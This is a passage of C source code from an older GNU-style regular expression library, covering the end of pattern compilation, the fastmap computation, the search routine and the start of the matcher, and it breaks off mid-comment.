                    (The upper bound and `jump_n' are omitted if
                    `upper_bound' is 1, though.)  */
                 else 
                   { /* If the upper bound is > 1, we need to insert
                        more at the end of the loop.  */
                     unsigned nbytes = 10 + (upper_bound > 1) * 10;

                     GET_BUFFER_SPACE (nbytes);

                     /* Initialize lower bound of the `succeed_n', even
                        though it will be set during matching by its
                        attendant `set_number_at' (inserted next),
                        because `re_compile_fastmap' needs to know.
                        Jump to the `jump_n' we might insert below.  */
                     INSERT_JUMP2 (succeed_n, laststart,
                                   b + 5 + (upper_bound > 1) * 5,
                                   lower_bound);
                     b += 5;

                     /* Code to initialize the lower bound.  Insert 
                        before the `succeed_n'.  The `5' is the last two
                        bytes of this `set_number_at', plus 3 bytes of
                        the following `succeed_n'.  */
                     insert_op2 (set_number_at, laststart, 5, lower_bound, b);
                     b += 5;

                     if (upper_bound > 1)
                       { /* More than one repetition is allowed, so
                            append a backward jump to the `succeed_n'
                            that starts this interval.
                            
                            When we've reached this during matching,
                            we'll have matched the interval once, so
                            jump back only `upper_bound - 1' times.  */
                         STORE_JUMP2 (jump_n, b, laststart + 5,
                                      upper_bound - 1);
                         b += 5;

                         /* The location we want to set is the second
                            parameter of the `jump_n'; that is `b-2' as
                            an absolute address.  `laststart' will be
                            the `set_number_at' we're about to insert;
                            `laststart+3' the number to set, the source
                            for the relative address.  But we are
                            inserting into the middle of the pattern --
                            so everything is getting moved up by 5.
                            Conclusion: (b - 2) - (laststart + 3) + 5,
                            i.e., b - laststart.
                            
                            We insert this at the beginning of the loop
                            so that if we fail during matching, we'll
                            reinitialize the bounds.  */
                         insert_op2 (set_number_at, laststart, b - laststart,
                                     upper_bound - 1, b);
                         b += 5;
                       }
                   }
                pending_exact = 0;
                beg_interval = NULL;
              }
              break;

            unfetch_interval:
              /* If an invalid interval, match the characters as literals.  */
               assert (beg_interval);
               p = beg_interval;
               beg_interval = NULL;

               /* normal_char and normal_backslash need `c'.  */
               PATFETCH (c);	

               if (!(syntax & RE_NO_BK_BRACES))
                 {
                   if (p > pattern  &&  p[-1] == '\\')
                     goto normal_backslash;
                 }
               goto normal_char;

#ifdef emacs
            /* There is no way to specify the before_dot and after_dot
               operators.  rms says this is ok.  --karl  */
            case '=':
              BUF_PUSH (at_dot);
              break;

            case 's':	
              laststart = b;
              PATFETCH (c);
              BUF_PUSH_2 (syntaxspec, syntax_spec_code[c]);
              break;

            case 'S':
              laststart = b;
              PATFETCH (c);
              BUF_PUSH_2 (notsyntaxspec, syntax_spec_code[c]);
              break;
#endif /* emacs */


            case 'w':
              laststart = b;
              BUF_PUSH (wordchar);
              break;


            case 'W':
              laststart = b;
              BUF_PUSH (notwordchar);
              break;


            case '<':
              BUF_PUSH (wordbeg);
              break;

            case '>':
              BUF_PUSH (wordend);
              break;

            case 'b':
              BUF_PUSH (wordbound);
              break;

            case 'B':
              BUF_PUSH (notwordbound);
              break;

            case '`':
              BUF_PUSH (begbuf);
              break;

            case '\'':
              BUF_PUSH (endbuf);
              break;

            case '1': case '2': case '3': case '4': case '5':
            case '6': case '7': case '8': case '9':
              if (syntax & RE_NO_BK_REFS)
                goto normal_char;

              c1 = c - '0';

              if (c1 > regnum)
                FREE_STACK_RETURN (REG_ESUBREG);

              /* Can't back reference to a subexpression if inside of it.  */
              if (group_in_compile_stack (compile_stack, c1))
                goto normal_char;

              laststart = b;
              BUF_PUSH_2 (duplicate, c1);
              break;


            case '+':
            case '?':
              if (syntax & RE_BK_PLUS_QM)
                goto handle_plus;
              else
                goto normal_backslash;

            default:
            normal_backslash:
              /* You might think it would be useful for \ to mean
                 not to translate; but if we don't translate it
                 it will never match anything.  */
              c = TRANSLATE (c);
              goto normal_char;
            }
          break;


	default:
        /* Expects the character in `c'.  */
	normal_char:
	      /* If no exactn currently being built.  */
          if (!pending_exact 

              /* If last exactn not at current position.  */
              || pending_exact + *pending_exact + 1 != b
              
              /* We have only one byte following the exactn for the count.  */
	      || *pending_exact == (1 << BYTEWIDTH) - 1

              /* If followed by a repetition operator.  */
              || *p == '*' || *p == '^'
	      || ((syntax & RE_BK_PLUS_QM)
		  ? *p == '\\' && (p[1] == '+' || p[1] == '?')
		  : (*p == '+' || *p == '?'))
	      || ((syntax & RE_INTERVALS)
                  && ((syntax & RE_NO_BK_BRACES)
		      ? *p == '{'
                      : (p[0] == '\\' && p[1] == '{'))))
	    {
	      /* Start building a new exactn.  */
              
              laststart = b;

	      BUF_PUSH_2 (exactn, 0);
	      pending_exact = b - 1;
            }
            
	  BUF_PUSH (c);
          (*pending_exact)++;
	  break;
        } /* switch (c) */
    } /* while p != pend */

  
  /* Through the pattern now.  */
  
  if (fixup_alt_jump)
    STORE_JUMP (jump_past_alt, fixup_alt_jump, b);

  if (!COMPILE_STACK_EMPTY) 
    FREE_STACK_RETURN (REG_EPAREN);

  free (compile_stack.stack);

  /* We have succeeded; set the length of the buffer.  */
  bufp->used = b - bufp->buffer;

#ifdef DEBUG
  if (debug)
    {
      DEBUG_PRINT1 ("\nCompiled pattern: \n");
      print_compiled_pattern (bufp);
    }
#endif /* DEBUG */

#ifndef MATCH_MAY_ALLOCATE
  /* Initialize the failure stack to the largest possible stack.  This
     isn't necessary unless we're trying to avoid calling alloca in
     the search and match routines.  */
  {
    int num_regs = bufp->re_nsub + 1;

    /* Since DOUBLE_FAIL_STACK refuses to double only if the current size
       is strictly greater than re_max_failures, the largest possible stack
       is 2 * re_max_failures failure points.  */
    if (fail_stack.size < (2 * re_max_failures * MAX_FAILURE_ITEMS))
      {
	fail_stack.size = (2 * re_max_failures * MAX_FAILURE_ITEMS);

#ifdef emacs
	if (! fail_stack.stack)
	  fail_stack.stack
	    = (fail_stack_elt_t *) xmalloc (fail_stack.size 
					    * sizeof (fail_stack_elt_t));
	else
	  fail_stack.stack
	    = (fail_stack_elt_t *) xrealloc (fail_stack.stack,
					     (fail_stack.size
					      * sizeof (fail_stack_elt_t)));
#else /* not emacs */
	if (! fail_stack.stack)
	  fail_stack.stack
	    = (fail_stack_elt_t *) malloc (fail_stack.size 
					   * sizeof (fail_stack_elt_t));
	else
	  fail_stack.stack
	    = (fail_stack_elt_t *) realloc (fail_stack.stack,
					    (fail_stack.size
					     * sizeof (fail_stack_elt_t)));
#endif /* not emacs */
      }

    /* Initialize some other variables the matcher uses.  */
    RETALLOC_IF (regstart,	 num_regs, const char *);
    RETALLOC_IF (regend,	 num_regs, const char *);
    RETALLOC_IF (old_regstart,	 num_regs, const char *);
    RETALLOC_IF (old_regend,	 num_regs, const char *);
    RETALLOC_IF (best_regstart,  num_regs, const char *);
    RETALLOC_IF (best_regend,	 num_regs, const char *);
    RETALLOC_IF (reg_info,	 num_regs, register_info_type);
    RETALLOC_IF (reg_dummy,	 num_regs, const char *);
    RETALLOC_IF (reg_info_dummy, num_regs, register_info_type);
  }
#endif

  return REG_NOERROR;
} /* regex_compile */

/* Subroutines for `regex_compile'.  */

/* Store OP at LOC followed by two-byte integer parameter ARG.  */

static void
store_op1 (op, loc, arg)
    re_opcode_t op;
    unsigned char *loc;
    int arg;
{
  *loc = (unsigned char) op;
  STORE_NUMBER (loc + 1, arg);
}


/* Like `store_op1', but for two two-byte parameters ARG1 and ARG2.  */

static void
store_op2 (op, loc, arg1, arg2)
    re_opcode_t op;
    unsigned char *loc;
    int arg1, arg2;
{
  *loc = (unsigned char) op;
  STORE_NUMBER (loc + 1, arg1);
  STORE_NUMBER (loc + 3, arg2);
}


/* Copy the bytes from LOC to END to open up three bytes of space at LOC
   for OP followed by two-byte integer parameter ARG.  */

static void
insert_op1 (op, loc, arg, end)
    re_opcode_t op;
    unsigned char *loc;
    int arg;
    unsigned char *end;    
{
  register unsigned char *pfrom = end;
  register unsigned char *pto = end + 3;

  while (pfrom != loc)
    *--pto = *--pfrom;
    
  store_op1 (op, loc, arg);
}


/* Like `insert_op1', but for two two-byte parameters ARG1 and ARG2.  */

static void
insert_op2 (op, loc, arg1, arg2, end)
    re_opcode_t op;
    unsigned char *loc;
    int arg1, arg2;
    unsigned char *end;    
{
  register unsigned char *pfrom = end;
  register unsigned char *pto = end + 5;

  while (pfrom != loc)
    *--pto = *--pfrom;
    
  store_op2 (op, loc, arg1, arg2);
}


/* P points to just after a ^ in PATTERN.  Return true if that ^ comes
   after an alternative or a begin-subexpression.  We assume there is at
   least one character before the ^.  */

static boolean
at_begline_loc_p (pattern, p, syntax)
    const char *pattern, *p;
    reg_syntax_t syntax;
{
  const char *prev = p - 2;
  boolean prev_prev_backslash = prev > pattern && prev[-1] == '\\';
  
  return
       /* After a subexpression?  */
       (*prev == '(' && (syntax & RE_NO_BK_PARENS || prev_prev_backslash))
       /* After an alternative?  */
    || (*prev == '|' && (syntax & RE_NO_BK_VBAR || prev_prev_backslash));
}


/* The dual of at_begline_loc_p.  This one is for $.  We assume there is
   at least one character after the $, i.e., `P < PEND'.  */

static boolean
at_endline_loc_p (p, pend, syntax)
    const char *p, *pend;
    int syntax;
{
  const char *next = p;
  boolean next_backslash = *next == '\\';
  const char *next_next = p + 1 < pend ? p + 1 : NULL;
  
  return
       /* Before a subexpression?  */
       (syntax & RE_NO_BK_PARENS ? *next == ')'
        : next_backslash && next_next && *next_next == ')')
       /* Before an alternative?  */
    || (syntax & RE_NO_BK_VBAR ? *next == '|'
        : next_backslash && next_next && *next_next == '|');
}


/* Returns true if REGNUM is in one of COMPILE_STACK's elements and 
   false if it's not.  */

static boolean
group_in_compile_stack (compile_stack, regnum)
    compile_stack_type compile_stack;
    regnum_t regnum;
{
  int this_element;

  for (this_element = compile_stack.avail - 1;  
       this_element >= 0; 
       this_element--)
    if (compile_stack.stack[this_element].regnum == regnum)
      return true;

  return false;
}


/* Read the ending character of a range (in a bracket expression) from the
   uncompiled pattern *P_PTR (which ends at PEND).  We assume the
   starting character is in `P[-2]'.  (`P[-1]' is the character `-'.)
   Then we set the translation of all bits between the starting and
   ending characters (inclusive) in the compiled pattern B.
   
   Return an error code.
   
   We use these short variable names so we can use the same macros as
   `regex_compile' itself.  */

static reg_errcode_t
compile_range (p_ptr, pend, translate, syntax, b)
    const char **p_ptr, *pend;
    char *translate;
    reg_syntax_t syntax;
    unsigned char *b;
{
  unsigned this_char;

  const char *p = *p_ptr;
  int range_start, range_end;
  
  if (p == pend)
    return REG_ERANGE;

  /* Even though the pattern is a signed `char *', we need to fetch
     with unsigned char *'s; if the high bit of the pattern character
     is set, the range endpoints will be negative if we fetch using a
     signed char *.

     We also want to fetch the endpoints without translating them; the 
     appropriate translation is done in the bit-setting loop below.  */
  /* The SVR4 compiler on the 3B2 had trouble with unsigned const char *.  */
  range_start = ((const unsigned char *) p)[-2];
  range_end   = ((const unsigned char *) p)[0];

  /* Have to increment the pointer into the pattern string, so the
     caller isn't still at the ending character.  */
  (*p_ptr)++;

  /* If the start is after the end, the range is empty.  */
  if (range_start > range_end)
    return syntax & RE_NO_EMPTY_RANGES ? REG_ERANGE : REG_NOERROR;

  /* Here we see why `this_char' has to be larger than an `unsigned
     char' -- the range is inclusive, so if `range_end' == 0xff
     (assuming 8-bit characters), we would otherwise go into an infinite
     loop, since all characters <= 0xff.  */
  for (this_char = range_start; this_char <= range_end; this_char++)
    {
      SET_LIST_BIT (TRANSLATE (this_char));
    }
  
  return REG_NOERROR;
}

/* re_compile_fastmap computes a ``fastmap'' for the compiled pattern in
   BUFP.  A fastmap records which of the (1 << BYTEWIDTH) possible
   characters can start a string that matches the pattern.  This fastmap
   is used by re_search to skip quickly over impossible starting points.

   The caller must supply the address of a (1 << BYTEWIDTH)-byte data
   area as BUFP->fastmap.
   
   We set the `fastmap', `fastmap_accurate', and `can_be_null' fields in
   the pattern buffer.

   Returns 0 if we succeed, -2 if an internal error.   */

int
re_compile_fastmap (bufp)
     struct re_pattern_buffer *bufp;
{
  int j, k;
#ifdef MATCH_MAY_ALLOCATE
  fail_stack_type fail_stack;
#endif
#ifndef REGEX_MALLOC
  char *destination;
#endif
  /* We don't push any register information onto the failure stack.  */
  unsigned num_regs = 0;
  
  register char *fastmap = bufp->fastmap;
  unsigned char *pattern = bufp->buffer;
  unsigned long size = bufp->used;
  unsigned char *p = pattern;
  register unsigned char *pend = pattern + size;

  /* Assume that each path through the pattern can be null until
     proven otherwise.  We set this false at the bottom of switch
     statement, to which we get only if a particular path doesn't
     match the empty string.  */
  boolean path_can_be_null = true;

  /* We aren't doing a `succeed_n' to begin with.  */
  boolean succeed_n_p = false;

  assert (fastmap != NULL && p != NULL);
  
  INIT_FAIL_STACK ();
  bzero (fastmap, 1 << BYTEWIDTH);  /* Assume nothing's valid.  */
  bufp->fastmap_accurate = 1;	    /* It will be when we're done.  */
  bufp->can_be_null = 0;
      
  while (p != pend || !FAIL_STACK_EMPTY ())
    {
      if (p == pend)
        {
          bufp->can_be_null |= path_can_be_null;
          
          /* Reset for next path.  */
          path_can_be_null = true;
          
          p = fail_stack.stack[--fail_stack.avail];
	}

      /* We should never be about to go beyond the end of the pattern.  */
      assert (p < pend);
      
#ifdef SWITCH_ENUM_BUG
      switch ((int) ((re_opcode_t) *p++))
#else
      switch ((re_opcode_t) *p++)
#endif
	{

        /* I guess the idea here is to simply not bother with a fastmap
           if a backreference is used, since it's too hard to figure out
           the fastmap for the corresponding group.  Setting
           `can_be_null' stops `re_search_2' from using the fastmap, so
           that is all we do.  */
	case duplicate:
	  bufp->can_be_null = 1;
          return 0;


      /* Following are the cases which match a character.  These end
         with `break'.  */

	case exactn:
          fastmap[p[1]] = 1;
	  break;


        case charset:
          for (j = *p++ * BYTEWIDTH - 1; j >= 0; j--)
	    if (p[j / BYTEWIDTH] & (1 << (j % BYTEWIDTH)))
              fastmap[j] = 1;
	  break;


	case charset_not:
	  /* Chars beyond end of map must be allowed.  */
	  for (j = *p * BYTEWIDTH; j < (1 << BYTEWIDTH); j++)
            fastmap[j] = 1;

	  for (j = *p++ * BYTEWIDTH - 1; j >= 0; j--)
	    if (!(p[j / BYTEWIDTH] & (1 << (j % BYTEWIDTH))))
              fastmap[j] = 1;
          break;


	case wordchar:
	  for (j = 0; j < (1 << BYTEWIDTH); j++)
	    if (SYNTAX (j) == Sword)
	      fastmap[j] = 1;
	  break;


	case notwordchar:
	  for (j = 0; j < (1 << BYTEWIDTH); j++)
	    if (SYNTAX (j) != Sword)
	      fastmap[j] = 1;
	  break;


        case anychar:
	  {
	    int fastmap_newline = fastmap['\n'];

	    /* `.' matches anything ...  */
	    for (j = 0; j < (1 << BYTEWIDTH); j++)
	      fastmap[j] = 1;

	    /* ... except perhaps newline.  */
	    if (!(bufp->syntax & RE_DOT_NEWLINE))
	      fastmap['\n'] = fastmap_newline;

	    /* Return if we have already set `can_be_null'; if we have,
	       then the fastmap is irrelevant.  Something's wrong here.  */
	    else if (bufp->can_be_null)
	      return 0;

	    /* Otherwise, have to check alternative paths.  */
	    break;
	  }

#ifdef emacs
        case syntaxspec:
	  k = *p++;
	  for (j = 0; j < (1 << BYTEWIDTH); j++)
	    if (SYNTAX (j) == (enum syntaxcode) k)
	      fastmap[j] = 1;
	  break;


	case notsyntaxspec:
	  k = *p++;
	  for (j = 0; j < (1 << BYTEWIDTH); j++)
	    if (SYNTAX (j) != (enum syntaxcode) k)
	      fastmap[j] = 1;
	  break;


      /* All cases after this match the empty string.  These end with
         `continue'.  */


	case before_dot:
	case at_dot:
	case after_dot:
          continue;
#endif /* not emacs */


        case no_op:
        case begline:
        case endline:
	case begbuf:
	case endbuf:
	case wordbound:
	case notwordbound:
	case wordbeg:
	case wordend:
        case push_dummy_failure:
          continue;


	case jump_n:
        case pop_failure_jump:
	case maybe_pop_jump:
	case jump:
        case jump_past_alt:
	case dummy_failure_jump:
          EXTRACT_NUMBER_AND_INCR (j, p);
	  p += j;	
	  if (j > 0)
	    continue;
            
          /* Jump backward implies we just went through the body of a
             loop and matched nothing.  Opcode jumped to should be
             `on_failure_jump' or `succeed_n'.  Just treat it like an
             ordinary jump.  For a * loop, it has pushed its failure
             point already; if so, discard that as redundant.  */
          if ((re_opcode_t) *p != on_failure_jump
	      && (re_opcode_t) *p != succeed_n)
	    continue;

          p++;
          EXTRACT_NUMBER_AND_INCR (j, p);
          p += j;		
	  
          /* If what's on the stack is where we are now, pop it.  */
          if (!FAIL_STACK_EMPTY () 
	      && fail_stack.stack[fail_stack.avail - 1] == p)
            fail_stack.avail--;

          continue;


        case on_failure_jump:
        case on_failure_keep_string_jump:
	handle_on_failure_jump:
          EXTRACT_NUMBER_AND_INCR (j, p);

          /* For some patterns, e.g., `(a?)?', `p+j' here points to the
             end of the pattern.  We don't want to push such a point,
             since when we restore it above, entering the switch will
             increment `p' past the end of the pattern.  We don't need
             to push such a point since we obviously won't find any more
             fastmap entries beyond `pend'.  Such a pattern can match
             the null string, though.  */
          if (p + j < pend)
            {
              if (!PUSH_PATTERN_OP (p + j, fail_stack))
                return -2;
            }
          else
            bufp->can_be_null = 1;

          if (succeed_n_p)
            {
              EXTRACT_NUMBER_AND_INCR (k, p);	/* Skip the n.  */
              succeed_n_p = false;
	    }

          continue;


	case succeed_n:
          /* Get to the number of times to succeed.  */
          p += 2;		

          /* Increment p past the n for when k != 0.  */
          EXTRACT_NUMBER_AND_INCR (k, p);
          if (k == 0)
	    {
              p -= 4;
  	      succeed_n_p = true;  /* Spaghetti code alert.  */
              goto handle_on_failure_jump;
            }
          continue;


	case set_number_at:
          p += 4;
          continue;


	case start_memory:
        case stop_memory:
	  p += 2;
	  continue;


	default:
          abort (); /* We have listed all the cases.  */
        } /* switch *p++ */

      /* Getting here means we have found the possible starting
         characters for one path of the pattern -- and that the empty
         string does not match.  We need not follow this path further.
         Instead, look at the next alternative (remembered on the
         stack), or quit if no more.  The test at the top of the loop
         does these things.  */
      path_can_be_null = false;
      p = pend;
    } /* while p */

  /* Set `can_be_null' for the last path (also the first path, if the
     pattern is empty).  */
  bufp->can_be_null |= path_can_be_null;
  return 0;
} /* re_compile_fastmap */

/* Set REGS to hold NUM_REGS registers, storing them in STARTS and
   ENDS.  Subsequent matches using PATTERN_BUFFER and REGS will use
   this memory for recording register information.  STARTS and ENDS
   must be allocated using the malloc library routine, and must each
   be at least NUM_REGS * sizeof (regoff_t) bytes long.

   If NUM_REGS == 0, then subsequent matches should allocate their own
   register data.

   Unless this function is called, the first search or match using
   PATTERN_BUFFER will allocate its own register data, without
   freeing the old data.  */

void
re_set_registers (bufp, regs, num_regs, starts, ends)
    struct re_pattern_buffer *bufp;
    struct re_registers *regs;
    unsigned num_regs;
    regoff_t *starts, *ends;
{
  if (num_regs)
    {
      bufp->regs_allocated = REGS_REALLOCATE;
      regs->num_regs = num_regs;
      regs->start = starts;
      regs->end = ends;
    }
  else
    {
      bufp->regs_allocated = REGS_UNALLOCATED;
      regs->num_regs = 0;
      regs->start = regs->end = (regoff_t *) 0;
    }
}

/* Searching routines.  */

/* Like re_search_2, below, but only one string is specified, and
   doesn't let you say where to stop matching. */

int
re_search (bufp, string, size, startpos, range, regs)
     struct re_pattern_buffer *bufp;
     const char *string;
     int size, startpos, range;
     struct re_registers *regs;
{
  return re_search_2 (bufp, NULL, 0, string, size, startpos, range, 
		      regs, size);
}


/* Using the compiled pattern in BUFP->buffer, first tries to match the
   virtual concatenation of STRING1 and STRING2, starting first at index
   STARTPOS, then at STARTPOS + 1, and so on.
   
   STRING1 and STRING2 have length SIZE1 and SIZE2, respectively.
   
   RANGE is how far to scan while trying to match.  RANGE = 0 means try
   only at STARTPOS; in general, the last start tried is STARTPOS +
   RANGE.
   
   In REGS, return the indices of the virtual concatenation of STRING1
   and STRING2 that matched the entire BUFP->buffer and its contained
   subexpressions.
   
   Do not consider matching one past the index STOP in the virtual
   concatenation of STRING1 and STRING2.

   We return either the position in the strings at which the match was
   found, -1 if no match, or -2 if error (such as failure
   stack overflow).  */

int
re_search_2 (bufp, string1, size1, string2, size2, startpos, range, regs, stop)
     struct re_pattern_buffer *bufp;
     const char *string1, *string2;
     int size1, size2;
     int startpos;
     int range;
     struct re_registers *regs;
     int stop;
{
  int val;
  register char *fastmap = bufp->fastmap;
  register char *translate = bufp->translate;
  int total_size = size1 + size2;
  int endpos = startpos + range;

  /* Check for out-of-range STARTPOS.  */
  if (startpos < 0 || startpos > total_size)
    return -1;
    
  /* Fix up RANGE if it might eventually take us outside
     the virtual concatenation of STRING1 and STRING2.  */
  if (endpos < -1)
    range = -1 - startpos;
  else if (endpos > total_size)
    range = total_size - startpos;

  /* If the search isn't to be a backwards one, don't waste time in a
     search for a pattern that must be anchored.  */
  if (bufp->used > 0 && (re_opcode_t) bufp->buffer[0] == begbuf && range > 0)
    {
      if (startpos > 0)
	return -1;
      else
	range = 1;
    }

  /* Update the fastmap now if not correct already.  */
  if (fastmap && !bufp->fastmap_accurate)
    if (re_compile_fastmap (bufp) == -2)
      return -2;
  
  /* Loop through the string, looking for a place to start matching.  */
  for (;;)
    { 
      /* If a fastmap is supplied, skip quickly over characters that
         cannot be the start of a match.  If the pattern can match the
         null string, however, we don't need to skip characters; we want
         the first null string.  */
      if (fastmap && startpos < total_size && !bufp->can_be_null)
	{
	  if (range > 0)	/* Searching forwards.  */
	    {
	      register const char *d;
	      register int lim = 0;
	      int irange = range;

              if (startpos < size1 && startpos + range >= size1)
                lim = range - (size1 - startpos);

	      d = (startpos >= size1 ? string2 - size1 : string1) + startpos;
   
              /* Written out as an if-else to avoid testing `translate'
                 inside the loop.  */
	      if (translate)
                while (range > lim
                       && !fastmap[(unsigned char)
				   translate[(unsigned char) *d++]])
                  range--;
	      else
                while (range > lim && !fastmap[(unsigned char) *d++])
                  range--;

	      startpos += irange - range;
	    }
	  else				/* Searching backwards.  */
	    {
	      register char c = (size1 == 0 || startpos >= size1
                                 ? string2[startpos - size1] 
                                 : string1[startpos]);

	      if (!fastmap[(unsigned char) TRANSLATE (c)])
		goto advance;
	    }
	}

      /* If can't match the null string, and that's all we have left, fail.  */
      if (range >= 0 && startpos == total_size && fastmap
          && !bufp->can_be_null)
	return -1;

      val = re_match_2_internal (bufp, string1, size1, string2, size2,
				 startpos, regs, stop);
#ifndef REGEX_MALLOC
#ifdef C_ALLOCA
      alloca (0);
#endif
#endif

      if (val >= 0)
	return startpos;
        
      if (val == -2)
	return -2;

    advance:
      if (!range) 
        break;
      else if (range > 0) 
        {
          range--; 
          startpos++;
        }
      else
        {
          range++; 
          startpos--;
        }
    }
  return -1;
} /* re_search_2 */

/* Declarations and macros for re_match_2.  */

static int bcmp_translate ();
static boolean alt_match_null_string_p (),
               common_op_match_null_string_p (),
               group_match_null_string_p ();

/* This converts PTR, a pointer into one of the search strings `string1'
   and `string2' into an offset from the beginning of that string.  */
#define POINTER_TO_OFFSET(ptr)			\
  (FIRST_STRING_P (ptr)				\
   ? ((regoff_t) ((ptr) - string1))		\
   : ((regoff_t) ((ptr) - string2 + size1)))

/* Macros for dealing with the split strings in re_match_2.  */

#define MATCHING_IN_FIRST_STRING  (dend == end_match_1)

/* Call before fetching a character with *d.  This switches over to
   string2 if necessary.  */
#define PREFETCH()							\
  while (d == dend)						    	\
    {									\
      /* End of string2 => fail.  */					\
      if (dend == end_match_2) 						\
        goto fail;							\
      /* End of string1 => advance to string2.  */ 			\
      d = string2;						        \
      dend = end_match_2;						\
    }


/* Test if at very beginning or at very end of the virtual concatenation
   of `string1' and `string2'.  If only one string, it's `string2'.  */
#define AT_STRINGS_BEG(d) ((d) == (size1 ? string1 : string2) || !size2)
#define AT_STRINGS_END(d) ((d) == end2)	


/* Test if D points to a character which is word-constituent.  We have
   two special cases to check for: if past the end of string1, look at
   the first character in string2; and if before the beginning of
   string2, look at the last character in string1.  */
#define WORDCHAR_P(d)							\
  (SYNTAX ((d) == end1 ? *string2					\
           : (d) == string2 - 1 ? *(end1 - 1) : *(d))			\
   == Sword)

/* Test if the character before D and the one at D differ with respect
   to being word-constituent.  */
#define AT_WORD_BOUNDARY(d)						\
  (AT_STRINGS_BEG (d) || AT_STRINGS_END (d)				\
   || WORDCHAR_P (d - 1) != WORDCHAR_P (d))


/* Free everything we malloc.  */
#ifdef MATCH_MAY_ALLOCATE
#ifdef REGEX_MALLOC
#define FREE_VAR(var) if (var) free (var); var = NULL
#define FREE_VARIABLES()						\
  do {									\
    FREE_VAR (fail_stack.stack);					\
    FREE_VAR (regstart);						\
    FREE_VAR (regend);							\
    FREE_VAR (old_regstart);						\
    FREE_VAR (old_regend);						\
    FREE_VAR (best_regstart);						\
    FREE_VAR (best_regend);						\
    FREE_VAR (reg_info);						\
    FREE_VAR (reg_dummy);						\
    FREE_VAR (reg_info_dummy);						\
  } while (0)
#else /* not REGEX_MALLOC */
/* This used to do alloca (0), but now we do that in the caller.  */
#define FREE_VARIABLES() /* Nothing */
#endif /* not REGEX_MALLOC */
#else
#define FREE_VARIABLES() /* Do nothing!  */
#endif /* not MATCH_MAY_ALLOCATE */

/* These values must meet several constraints.  They must not be valid
   register values; since we have a limit of 255 registers (because
   we use only one byte in the pattern for the register number), we can
   use numbers larger than 255.  They must differ by 1, because of
   NUM_FAILURE_ITEMS above.  And the value for the lowest register must
   be larger than the value for the highest register, so we do not try
   to actually save any registers when none are active.  */
#define NO_HIGHEST_ACTIVE_REG (1 << BYTEWIDTH)
#define NO_LOWEST_ACTIVE_REG (NO_HIGHEST_ACTIVE_REG + 1)

/* Matching routines.  */

#ifndef emacs   /* Emacs never uses this.  */
/* re_match is like re_match_2 except it takes only a single string.  */

int
re_match (bufp, string, size, pos, regs)
     struct re_pattern_buffer *bufp;
     const char *string;
     int size, pos;
     struct re_registers *regs;
{
  int result = re_match_2_internal (bufp, NULL, 0, string, size,
				    pos, regs, size);
  alloca (0);
  return result;
}
#endif /* not emacs */


/* re_match_2 matches the compiled pattern in BUFP against the
   the (virtual) concatenation of STRING1 and STRING2 (of length SIZE1
   and SIZE2, respectively).  We start matching at POS, and stop
   matching at STOP.
   
   If REGS is non-null and the `no_sub' field of BUFP is nonzero, we
   store offsets for the substring each group matched in REGS.  See the
   documentation for exactly how many groups we fill.

   We return -1 if no match, -2 if an internal error (such as the
   failure stack overflowing).  Otherwise, we return the length of the
   matched substring.  */

int
re_match_2 (bufp, string1, size1, string2, size2, pos, regs, stop)
     struct re_pattern_buffer *bufp;
     const char *string1, *string2;
     int size1, size2;
     int pos;
     struct re_registers *regs;
     int stop;
{
  int result = re_match_2_internal (bufp, string1, size1, string2, size2,
				    pos, regs, stop);
  alloca (0);
  return result;
}

/* This is a separate function so that we can force an alloca cleanup
   afterwards.  */
static int
re_match_2_internal (bufp, string1, size1, string2, size2, pos, regs, stop)
     struct re_pattern_buffer *bufp;
     const char *string1, *string2;
     int size1, size2;
     int pos;
     struct re_registers *regs;
     int stop;
{
  /* General temporaries.  */
  int mcnt;
  unsigned char *p1;

  /* Just past the end of the corresponding string.  */
  const char *end1, *end2;

  /* Pointers into string1 and string2, just past the last characters in
     each to consider matching.  */
  const char *end_match_1, *end_match_2;

  /* Where we are in the data, and the end of the current string.  */
  const char *d, *dend;
  
  /* Where we are in the pattern, and the end of the pattern.  */
  unsigned char *p = bufp->buffer;
  register unsigned char *pend = p + bufp->used;

  /* Mark the opcode just after a start_memory, so we can test for an
     empty subpattern when we get to the stop_memory.  */
  unsigned char *just_past_start_mem = 0;

  /* We use this to map every character in the string.  */
  char *translate = bufp->translate;

  /* Failure point stack.  Each place that can handle a failure further
     down the line pushes a failure point on this stack.  It consists of
     restart, regend, and reg_info for all registers corresponding to
     the subexpressions we're currently inside, plus the number of such
     registers, and, finally, two char *'s.  The first char * is where
     to resume scanning the pattern; the second one is where to resume
     scanning the strings.  If the latter is zero, the failure point is
     a ``dummy''; if a failure happens and the failure point is a dummy,
     it gets discarded and the next next one is tried.  */
#ifdef MATCH_MAY_ALLOCATE /* otherwise, this is global.  */
  fail_stack_type fail_stack;
#endif
#ifdef DEBUG
  static unsigned failure_id = 0;
  unsigned nfailure_points_pushed = 0, nfailure_points_popped = 0;
#endif

  /* We fill all the registers internally, independent of what we
     return, for use in backreferences.  The number here includes
     an element for register zero.  */
  unsigned num_regs = bufp->re_nsub + 1;
  
  /* The currently active registers.  */
  unsigned lowest_active_reg = NO_LOWEST_ACTIVE_REG;
  unsigned highest_active_reg = NO_HIGHEST_ACTIVE_REG;

  /* Information on the contents of registers. These are pointers into
     the input strings; they record just what was matched (on this
     attempt) by a subexpression part of the pattern, that is, the
     regnum-th regstart pointer points to where in the pattern we began
     matching and the regnum-th regend points to right after where we
     stopped matching the regnum-th subexpression.  (The zeroth register
     keeps track of what the whole pattern matches.)  */
#ifdef MATCH_MAY_ALLOCATE /* otherwise, these are global.  */
  const char **regstart, **regend;
#endif

  /* If a group that's operated upon by a repetition operator fails to
     match anything, then the register for its start will need to be
     restored because it will have been set to wherever in the string we
     are when we last see its open-group operator.  Similarly for a
     register's end.  */
#ifdef MATCH_MAY_ALLOCATE /* otherwise, these are global.  */
  const char **old_regstart, **old_regend;
#endif

  /* The is_active field of reg_info helps us keep track of which (possibly
     nested) subexpressions we are currently in. The matched_something
     field of reg_info[reg_num] helps us tell whether or not we have
     matched any of the pattern so far this time through the reg_num-th
     subexpression.  These two fields get reset each time through any
     loop their register is in.  */
#ifdef MATCH_MAY_ALLOCATE /* otherwise, this is global.  */
  register_info_type *reg_info; 
#endif

  /* The following record the register info as found in the above
     variables when we find a match better than any we've seen before. 
     This happens as we backtrack through the failure points, which in
     turn happens only if we have not yet matched the entire string. */
  unsigned best_regs_set = false;
#ifdef MATCH_MAY_ALLOCATE /* otherwise, these are global.  */
  const char **best_regstart, **best_regend;
#endif
  
  /* Logically, this is `best_regend[0]'.  But we don't want to have to
     allocate space for that if we're not allocating space for anything
     else (see below).  Also, we never need info about register 0 for
     any of the other register vectors, and it seems rather a kludge to
